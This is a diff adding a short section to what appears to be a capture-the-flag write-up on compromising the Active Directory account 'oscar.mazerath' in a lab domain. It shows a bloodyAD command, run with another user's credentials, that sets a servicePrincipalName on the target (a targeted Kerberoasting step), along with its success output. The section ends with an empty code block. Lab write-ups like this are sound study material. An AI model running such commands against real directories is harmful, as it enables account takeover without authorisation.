@@ -552,3 +552,13 @@ Also after getting a session as `caleb.turner` i can get the user flag
 
 # Compromising `oscar.mazerath`
 
+```python
+bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u caleb.turner -p '//newpassword123' -k set object 'CN=OSCAR.MAZERATH,OU=IT-TIER1,DC=HSM-DEFENSE,DC=LOCAL' servicePrincipalName -v 'service/hacked'
+[+] CN=OSCAR.MAZERATH,OU=IT-TIER1,DC=HSM-DEFENSE,DC=LOCAL's servicePrincipalName has been updated
+```
+
+First ill set the SPN
+
+```python
+
+```
